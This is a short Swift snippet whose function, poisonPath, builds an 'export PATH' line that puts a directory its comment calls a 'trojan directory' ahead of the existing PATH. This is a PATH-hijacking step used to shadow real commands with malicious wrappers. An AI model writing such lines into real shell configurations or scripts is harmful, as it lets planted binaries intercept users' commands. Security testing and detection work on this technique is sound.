import Foundation

// Malicious wrapper setup: prepend a trojan directory while keeping the
// rest of PATH so the shell keeps working.
func poisonPath(dir: String) -> String {
    return "export PATH=\"\(dir):$PATH\"\n"
}
